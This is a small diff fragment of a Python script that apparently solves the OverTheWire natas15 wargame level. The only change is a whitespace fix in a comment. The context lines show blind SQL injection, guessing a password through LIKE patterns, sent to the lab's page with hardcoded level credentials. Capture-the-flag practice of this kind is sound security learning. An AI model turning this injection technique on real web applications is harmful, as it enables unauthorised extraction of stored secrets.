@@ -28,7 +28,7 @@ def get_password():
            string="'"+string_start+character+"%'"
             
            #Connect to the web page, send username and password, then
-	         #send our query as a parameter.
+	   #send our query as a parameter.
 	    
            request = urllib2.Request("http://natas15.natas.labs.overthewire.org/index.php")
            base64string = base64.encodestring('%s:%s' % ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')).replace('\n', '')
